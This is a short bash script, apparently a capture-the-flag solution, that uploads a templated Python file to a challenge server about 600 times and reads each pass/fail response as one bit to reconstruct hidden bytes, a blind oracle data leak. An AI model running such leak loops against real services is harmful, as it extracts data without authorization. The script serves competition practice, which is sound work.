# newweb.sh
sum=0
prod=1
for i in {0..600} ; do
    sed "s/@NUM@/$i/g" newweb.py | curl -F 'file=@-' https://pyscript.ctf.zoolab.org 2>/dev/null | grep Fail -q
    ret=$?
    # echo $ret
    sum=$((sum + prod * ret))
    prod=$((prod * 2))
    if ((i % 8 == 7)); then
        printf "\x$(printf %x $sum)"
        sum=0
        prod=1
    fi
done